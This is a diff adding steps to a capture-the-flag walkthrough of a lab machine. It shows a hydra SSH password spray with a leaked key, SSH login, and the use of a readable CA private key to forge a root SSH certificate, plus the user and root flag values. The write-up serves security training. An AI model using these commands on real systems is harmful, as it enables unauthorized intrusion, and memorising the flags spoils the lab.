@@ -189,12 +189,39 @@ The notes also mention:
 - CA path: `/opt/principal/ssh`
 
 
+---
+
+## Step 5: Password Spray - SSH Access
+
+### Prepare User List
+
+```text
+cat > users.txt << EOF
+admin
+svc-deploy
+jthompson
+amorales
+bwright
+kkumar
+mwilson
+lzhang
+EOF
+```
+
 #### Password Spray
 
 I’ll save the usernames from the dashboard into `users.txt` and spray the encryptionKey as a password against SSH. `netexec` can do this spray, but it runs serially, waiting for each attempt to timeout before doing the next, so `hydra` is a better tool here:
 
+```bash
+hydra -L users.txt -p 'D3pl0y_$$H_Now42!' ssh://10.129.244.220
+```
+
+
 ![[Pasted image 20260805230810.png]]
 
+**Result:** Valid credentials found for `svc-deploy`:
+- Username: `svc-deploy`
+- Password: `D3pl0y_$$H_Now42!`
 
 It finds a match using the `encryptionKey` for the svc-deploy account.
 
@@ -202,27 +229,133 @@ It finds a match using the `encryptionKey` for the svc-deploy account.
 
 I’ll use the creds to get a shell using SSH:
 
+```bash
+ssh svc-deploy@10.129.244.220
+Password: D3pl0y_$$H_Now42!
+```
+
+
 ![[Pasted image 20260805230944.png]]
 
 
-And grab the user flag:
+### User Flag
+
+```bash
+svc-deploy@principal:~$ cat user.txt
+470e63f2e948c5a6c108494f7f4fa346
+```
+
 
 ![[Pasted image 20260805231005.png]]
+
+
+
+---
+
+## Step 6: Privilege Escalation - SSH Certificate Abuse
+
+### Enumeration
+
+```bash
+svc-deploy@principal:~$ id
+uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
+```
+
+```bash
+svc-deploy@principal:~$ sudo -l
+[sudo] password for svc-deploy: 
+Sorry, user svc-deploy may not run sudo on principal.
+```
+
+```bash
+svc-deploy@principal:~$ ls -la /opt/principal/ssh/
+total 16
+drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
+drwxr-xr-x 5 app  app       4096 Mar 11 04:22 ..
+-rw-r----- 1 root deployers 3243 Mar 11 04:22 ca
+-rw-r--r-- 1 root root      736 Mar 11 04:22 ca.pub
+-rw-r--r-- 1 root root      525 Mar 11 04:22 README.txt
+```
 
 
 ![[Pasted image 20260805233338.png]]
 
 
+### Inspect CA Certificate
+
+```bash
+svc-deploy@principal:/opt/principal/ssh$ cat ca
+```
+
+
 ![[Pasted image 20260805233314.png]]
 
+### SSHd Configuration
+
+```bash
+svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-principal.conf
+# Principal machine SSH configuration
+PubkeyAuthentication yes
+PasswordAuthentication yes
+PermitRootLogin prohibit-password
+TrustedUserCAKeys /opt/principal/ssh/ca.pub
+```
+
+The `TrustedUserCAKeys` directive means any certificate signed by the CA private key will be trusted for authentication. Since `PermitRootLogin` is set to `prohibit-password`, certificate-based root login is allowed.
+
+---
+
+## Step 7: Forge Root SSH Certificate
+
+### Generate SSH Key Pair
+
+```bash
+ssh-keygen -t ed25519 -f root-ssh
+```
+
+### Sign with CA Private Key
+
+```bash
+ssh-keygen -s ca -I 0xdf -n root root-ssh
+```
+
+- `-s ca` : Use the CA private key for signing
+- `-I 0xdf` : Identity label (arbitrary)
+- `-n root` : Principal name (maps to username `root`)
+
+### Verify Certificate
+
+```bash
+cat root-ssh-cert.pub
+```
+
+### SSH as Root
+
+```bash
+ssh -i root-ssh root@10.129.244.220
+```
 
 
 ![[Pasted image 20260805233530.png]]
 
+### Root Flag
 
+*root.txt*
 ![[Pasted image 20260805233723.png]]
 
 
+```bash
+root@principal:~# cat root/root.txt
+bdfd9dcc98ccdcb5f73b1ce6321fa3bb
+```
+
+---
+
+## Step 8: Machine Owned
+
 ![[Pasted image 20260805233743.png|700]]
 
+
+---
+---
 
